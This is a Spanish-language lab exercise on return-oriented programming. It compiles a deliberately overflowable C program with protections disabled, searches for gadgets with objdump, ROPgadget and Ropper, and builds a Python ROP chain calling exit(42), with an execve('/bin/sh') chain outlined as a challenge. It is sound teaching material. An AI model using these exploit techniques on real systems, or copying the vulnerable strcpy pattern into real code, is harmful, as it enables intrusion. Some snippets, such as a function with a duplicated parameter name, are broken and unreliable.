# Ejercicio 06: ROP Gadgets - Return-Oriented Programming Basics

## Objetivos de Aprendizaje

- Entender qué es un ROP gadget
- Buscar gadgets útiles en un binario
- Encadenar gadgets simples
- Preparación conceptual para ROP chains

## Tiempo Estimado

75-90 minutos

## Dificultad

⭐⭐⭐ Intermedio-Avanzado

---

## Parte 1: ¿Por Qué ROP?

### El Problema: NX Bit

En ejercicios anteriores, compilamos con `-z execstack` para que el stack sea ejecutable.

En un sistema real, el stack NO es ejecutable (NX bit).

```bash
gcc -z noexecstack -o binario binario.c  # NX activado
# Ahora el shellcode NO puede ejecutarse
```

### La Solución: ROP (Return-Oriented Programming)

En lugar de ejecutar código nuevo, **reutilizamos el que ya existe**.

```
Idea:
- El programa tiene código útil en memoria
- Podemos hacer que retorne a direcciones específicas
- Cada "gadget" es una instrucción útil que termina en "ret"
- Encadenamos gadgets para lograr objetivo
```

### Ejemplo Simple

```
Gadget 1: pop rdi; ret        (dirección 0x400500)
Gadget 2: pop rsi; ret        (dirección 0x400502)
Gadget 3: syscall; ret        (dirección 0x400504)

Stack que construimos:
[gadget 1][valor 1][gadget 2][valor 2][gadget 3]

Ejecución:
1. ret → salta a gadget 1
2. pop rdi; ret → rdi = valor 1; ret
3. ret → salta a gadget 2
4. pop rsi; ret → rsi = valor 2; ret
5. ret → salta a gadget 3
6. syscall; ret → ejecuta syscall

Resultado: syscall con rdi=valor1, rsi=valor2
```

---

## Parte 2: Crear Binario para Análisis

### Programa con Muchos Gadgets

```bash
cat > gadgets.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Varias funciones que generan gadgets útiles
int suma(int a, int b) { return a + b; }
int resta(int a, int b) { return a - b; }
int mult(int a, int a) { return a * a; }

void vulnerable(char *entrada) {
    char buffer[16];
    strcpy(buffer, entrada);  // Overflow
}

// Esta función NO llamamos, pero su código tiene gadgets útiles
void helper() {
    asm("pop %rdi");
    asm("pop %rsi");
    asm("pop %rdx");
    asm("ret");
}

int main(int argc, char **argv) {
    if (argc > 1)
        vulnerable(argv[1]);
    
    printf("Programa con gadgets\n");
    return 0;
}
EOF
```

### Compilar SIN optimizar

```bash
gcc -g -O0 -fno-stack-protector -z execstack -no-pie \
    -o gadgets gadgets.c
```

---

## Parte 3: Buscar Gadgets Manualmente

### Técnica 1: Usando objdump

```bash
# Ver TODO el assembly
objdump -d -M intel gadgets | head -200

# Buscar "pop rdi"
objdump -d -M intel gadgets | grep "pop.*rdi"

# Buscar "ret"
objdump -d -M intel gadgets | grep "retq"
```

### Técnica 2: Buscar secuencias completas

```bash
# Gadget: pop rdi; ret
objdump -d -M intel gadgets | grep -B1 "retq" | grep -A1 "pop.*rdi"

# Esperado output:
# 400500:   5f                      pop    rdi
# 400501:   c3                      retq
```

### Técnica 3: Grep para múltiples instrucciones

```bash
# Buscar cualquier pop seguido de ret (en máximo 5 líneas)
objdump -d -M intel gadgets | grep -A5 "^0*400[0-9a-f]*:" | \
    grep -B3 "retq" | grep "pop"
```

### Script de búsqueda simple

```bash
cat > buscar_gadgets.sh << 'EOF'
#!/bin/bash
binario=$1
patron=$2

echo "=== Buscando gadgets con patrón: $patron ==="
objdump -d -M intel "$binario" | \
    grep -B5 "retq" | \
    grep "$patron"
EOF

chmod +x buscar_gadgets.sh
./buscar_gadgets.sh gadgets "pop.*rdi"
```

---

## Parte 4: Técnica de Herramientas Automatizadas

### Usar ROPgadget (si instalado)

```bash
# Instalar
pip3 install ropgadget

# Buscar gadgets
ROPgadget --binary gadgets --string "pop rdi"
```

Ejemplo output:

```
0x0000000000400500 : pop rdi ; ret
0x0000000000400502 : pop rsi ; ret
0x0000000000400504 : pop rdx ; ret
0x0000000000400506 : pop rcx ; ret
```

### Usar Ropper (alternativa)

```bash
# Instalar
pip3 install ropper

# Buscar
ropper --file gadgets --search "pop rdi; ret"
```

---

## Parte 5: Gadgets Útiles y Sus Usos

### Gadget tipo 1: Load Register

```asm
pop rdi
ret
```

**Uso:** Poner valor en RDI (primer argumento)

**Stack layout:**
```
[dirección de gadget]
[valor a cargar]
[siguiente gadget]
```

### Gadget tipo 2: Memory Move

```asm
mov rax, [rdi]
ret
```

**Uso:** Cargar valor desde memoria

### Gadget tipo 3: Arithmetic

```asm
add rax, rbx
ret
```

**Uso:** Hacer cálculos

### Gadget tipo 4: System Call

```asm
syscall
ret
```

**Uso:** Ejecutar syscall (requiere rax, rdi, rsi, rdx configurados)

---

## Parte 6: Construcción de ROP Chain Simple

### Objetivo: Llamar exit(42)

**Syscall para exit:**
- `rax = 60` (número de syscall exit)
- `rdi = 42` (código de salida)
- `syscall`

### Construir payload

```python
#!/usr/bin/env python3
from struct import pack
import subprocess

# Direcciones de gadgets (encontradas con ROPgadget)
pop_rdi = 0x400500     # pop rdi; ret
pop_rax = 0x400502     # pop rax; ret
syscall_gadget = 0x400600  # syscall; ret

# Offset al RIP (del ejercicio anterior)
offset = 24

# Construir ROP chain
payload = b"A" * offset
payload += pack("<Q", pop_rax)      # rax = 60
payload += pack("<Q", 60)           # argumento para pop rax

payload += pack("<Q", pop_rdi)      # rdi = 42
payload += pack("<Q", 42)           # argumento para pop rdi

payload += pack("<Q", syscall_gadget)  # ejecutar syscall

# Ejecutar
print("[*] Payload:", payload)
print("[*] Longitud:", len(payload))

resultado = subprocess.run(["./gadgets", payload],
                          capture_output=True)
print("[*] Return code:", resultado.returncode)
# Esperado: 42
```

### Verificar con GDB

```bash
gdb ./gadgets

(gdb) break vulnerable
(gdb) run $(python3 build_payload.py 2>/dev/null | grep Payload | cut -d: -f2-)
(gdb) continue
# Debería ejecutar syscall sin crash
```

---

## Parte 7: Análisis de Viabilidad

### Preguntas clave antes de explotar

1. **¿Existe el gadget?**
   ```bash
   objdump -d binario | grep "pop rdi"
   # Si sí → puedes cargar rdi
   ```

2. **¿En qué dirección?**
   ```bash
   objdump -d binario | grep -B1 "pop rdi"
   # Output: 400500: 5f pop rdi
   # Dirección: 0x400500
   ```

3. **¿Hay instrucciones de relleno?**
   ```bash
   objdump -d binario | grep -A3 "pop rdi"
   # Si hay "nop" o "mov", afecta el offset
   ```

4. **¿Puedo llamar syscall?**
   ```bash
   objdump -d binario | grep "syscall"
   # Si no hay, necesitas alternativa (call function)
   ```

---

## Checkpoints

✅ Completaste cuando:

- [ ] Compilaste gadgets.c sin protecciones
- [ ] Encontraste al menos 3 gadgets útiles con objdump
- [ ] Creaste script para buscar gadgets específicos
- [ ] Entendiste por qué ROP es necesario (NX bit)
- [ ] Conoces diferencia entre gadget y regular code
- [ ] Puedes listar gadgets disponibles manualmente
- [ ] Entiendes stack layout de ROP chain
- [ ] Pudiste construir payload teórico

---

## Desafío Extra

### Nivel 1: Crear Script de Búsqueda

```bash
#!/bin/bash
# rop_finder.sh

binario=$1
formato=$2  # Ej: "pop rdi; ret"

echo "Buscando: $formato"

objdump -d -M intel "$binario" | \
    awk -v fmt="$formato" '
    /^[0-9a-f]+.*:/ { addr=$1; addr=substr(addr, 1, length(addr)-1) }
    /ret/ { if (NR > 1 && prev ~ /'"$formato"'/) print addr ": " prev; prev="" }
    { prev=$0 }
    '
```

### Nivel 2: Verificar Gadgets Funcionan

```python
# Script que verifica si gadget ejecuta correctamente
# En GDB sin crashear
```

### Nivel 3: Cadena Más Compleja

```python
# ROP chain que:
# 1. Carga rdi = dirección de string "/bin/sh"
# 2. Carga rsi = 0
# 3. Carga rdx = 0
# 4. Carga rax = 59 (syscall execve)
# 5. Ejecuta syscall
```

---

## Conceptos Clave Aprendidos

### ROP (Return-Oriented Programming)
- Usa "gadgets" del código existente
- Cada gadget termina en "ret"
- Encadena gadgets en el stack
- Funciona incluso con NX bit

### Búsqueda de Gadgets
- objdump -d para ver assembly
- Grep para patrones
- Herramientas: ROPgadget, Ropper
- Manualmente: tedioso pero educativo

### Stack Layout de ROP
- Overflow hasta RIP
- Poner dirección de primer gadget en RIP
- Apile argumentos debajo
- El CPU seguirá la cadena

---

## Relación con Buffer Overflow

```
Buffer Overflow (Ejercicio 04):
- Controlar RIP
- Saltar a código útil
- Stack ejecutable (shellcode)

ROP Chains (Este ejercicio):
- Controlar RIP (igual)
- Saltar a gadgets existentes
- Encadenar gadgets
- Funciona con NX bit (mejor defensa)
```

---

## Lecturas Relacionadas

- `recursos/hints-futuros.md` - ROP chains avanzado
- `recursos/gdb-guia.md` - Debugging de ROP
- `referencias.md` - Papers sobre ROP

---

## Conceptos Relacionados (Avanzado)

- **ASLR Bypass:** Leak gadget addresses
- **CFI (Control Flow Integrity):** Protección contra ROP
- **Gadget Chaining:** Construir operaciones complejas
- **Automatic ROP:** Herramientas que generan chains automáticamente

## Siguiente en la Serie

**Nivel Bonus:** Desafíos integrados combinando todas las técnicas

---

## Nota sobre Siguiente Proyecto

En el siguiente proyecto de la serie:
- ROP chains serán más complejas
- Habrá ASLR activado
- Necesitarás leaks de información
- Automatizar la búsqueda de gadgets

Este ejercicio es tu fundación.
